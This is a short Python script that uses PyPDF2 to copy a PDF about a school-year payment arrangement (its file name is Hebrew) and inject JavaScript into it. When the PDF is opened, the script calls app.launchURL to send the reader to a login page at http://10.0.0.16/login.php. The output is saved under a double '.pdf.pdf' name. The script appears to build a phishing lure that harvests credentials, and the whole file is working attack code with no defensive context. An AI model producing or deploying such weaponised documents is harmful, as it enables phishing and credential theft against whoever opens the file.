#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import PyPDF2

doc = os.path.join(os.path.dirname(__file__), "הסדרת תשלום לשנה_ל תשע_ט.pdf")
rs = os.path.join(os.path.dirname(__file__), "הסדרת תשלום לשנה_ל תשע_ט.pdf.pdf")
unmeta = PyPDF2.PdfFileReader(doc, "rb")

meta = PyPDF2.PdfFileWriter()
meta.appendPagesFromReader(unmeta)

meta.addJS("app.launchURL(\"http://10.0.0.16/login.php\",true);")

with open(rs, 'wb') as fp:
    meta.write(fp)
